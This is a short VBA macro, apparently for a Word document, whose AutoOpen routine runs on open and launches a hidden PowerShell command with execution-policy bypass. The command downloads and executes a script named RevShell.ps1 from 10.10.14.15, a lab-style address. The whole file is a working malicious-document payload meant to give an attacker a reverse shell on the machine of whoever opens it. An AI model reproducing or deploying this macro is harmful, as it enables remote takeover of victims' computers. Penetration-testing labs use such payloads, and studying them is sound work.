Sub TestMacro()
'
' TestMacro Macro
'
'
cmd = "powershell.exe -exec bypass -c iex(new-object net.webclient).downloadstring('http://10.10.14.15/RevShell.ps1')"
exec = Shell(cmd, vbHide)

End Sub

Sub AutoOpen()
    TestMacro
End Sub
